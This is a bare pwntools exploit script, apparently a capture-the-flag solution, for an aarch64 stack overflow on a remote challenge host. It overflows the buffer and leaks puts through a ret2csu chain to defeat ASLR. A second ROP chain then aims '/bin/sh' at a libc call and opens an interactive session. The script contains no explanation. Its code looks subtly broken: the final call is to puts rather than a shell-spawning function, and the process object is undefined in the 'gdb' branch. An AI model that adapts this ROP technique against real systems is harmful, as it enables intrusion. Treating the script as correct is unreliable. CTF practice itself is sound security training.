from pwn import *
from sys import *

elf = context.binary = ELF("./vuln")
#p = process(["qemu-aarch64", "-L", ".", "-g", "1234", "./vuln"])
#p = process(["qemu-aarch64", "-L", ".", "./vuln"])
# p = process("./vuln")
libc = ELF("./libc.so.6")

HOST = 'generic-rop-challenge.chal.imaginaryctf.org'
PORT = 42042

cmd = """
b*0x400948
"""
if(argv[1] == 'gdb'):
    gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
    p = remote(HOST,PORT)



def csu_rop(call, x0, x1, x2):
    payload = flat(0x400948, b'00000000', 0x400928, 0, 1, call)
    payload += flat(x0, x1, x2)
    payload += b'22222222'
    return payload



payload = b'A'*0x40
payload += p64(0xdeadbeef)
payload += csu_rop(elf.got['puts'], elf.got['puts'], 0x0, 0x0)
payload += p64(elf.entry)

#payload += p64(0x00000000004008C4)
p.sendline(payload)
p.recvuntil(b'below\n')
leak = u64(p.recvline().rstrip().ljust(8, b'\x00'))
libc.address = (leak - libc.sym['puts'])
print(hex(libc.address),hex(leak))

rop = ROP(libc)
payload = b'A'*0x40
payload += p64(0xdeadbeef)
payload += p64(libc.search(asm('ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += b'A'*8
payload += p64(libc.search(asm('mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;')).__next__())
payload += p64(libc.search(b"/bin/sh").__next__())
payload += b'X'*16
payload += p64(libc.sym.puts)
sleep(2)
p.sendline(payload)
p.interactive()